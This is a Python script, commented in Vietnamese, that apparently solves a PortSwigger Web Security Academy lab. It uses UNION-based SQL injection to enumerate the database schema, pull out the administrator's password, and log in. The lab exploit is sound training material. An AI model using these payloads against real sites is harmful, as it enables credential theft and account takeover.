import requests
from bs4 import BeautifulSoup

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").strip().rstrip("/")
s = requests.Session()

# 1. Tìm bảng users_xxx
r = s.get(f"{url}/filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--")
soup = BeautifulSoup(r.text, "html.parser")
random = next((th.text.strip().split("_", 1)[1] for th in soup.find_all("th") if th.text.strip().startswith("users_")), None)

# 2. Tìm cột username_xxx và password_xxx
r = s.get(f"{url}/filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_{random}'--")
soup = BeautifulSoup(r.text, "html.parser")
cols = [th.text.strip() for th in soup.find_all("th")]
random1 = next((c.split("_",1)[1] for c in cols if c.startswith("username_")), None)
random2 = next((c.split("_",1)[1] for c in cols if c.startswith("password_")), None)

# 3. Lấy password của administrator
r = s.get(f"{url}/filter?category=Gifts'+UNION+SELECT+username_{random1}||':'||password_{random2},NULL+FROM+users_{random}--")
soup = BeautifulSoup(r.text, "html.parser")
password = next((th.text.strip().split(":",1)[1] for th in soup.find_all("th") if th.text.strip().startswith("administrator:")), None)

# 4. Đăng nhập
if password:
    r = s.get(f"{url}/login")
    csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]
    data = {"csrf": csrf, "username": "administrator", "password": password}
    r = s.post(f"{url}/login", data=data)
    print("Đăng nhập thành công!" if "Welcome" in r.text else "Đăng nhập thất bại.")
else:
    print("Không tìm thấy mật khẩu administrator.")
